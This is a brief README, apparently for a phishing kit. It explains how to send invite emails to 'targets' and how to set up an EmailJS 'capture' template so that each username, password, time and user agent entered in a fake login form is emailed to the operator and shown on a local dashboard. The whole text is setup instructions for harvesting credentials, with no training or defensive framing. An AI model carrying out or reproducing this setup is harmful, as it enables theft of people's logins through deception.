Quick start

1. Go to Config and save your EmailJS keys.
2. Go to Send invites, add recipients, and fire invite emails.
3. When targets submit your login form, entries appear under Responses.
4. Responses are stored locally in your browser — no backend needed.

EmailJS — capture template setup

In your EmailJS account, create a second template (the "capture" template) with these variables:

{{username}}   {{password}}   {{time}}   {{user_agent}}

Then paste its template ID into index.html as EJS_TEMPLATE_ID.
When a target submits the login form, the email arrives in your inbox and this dashboard auto-parses it from localStorage.
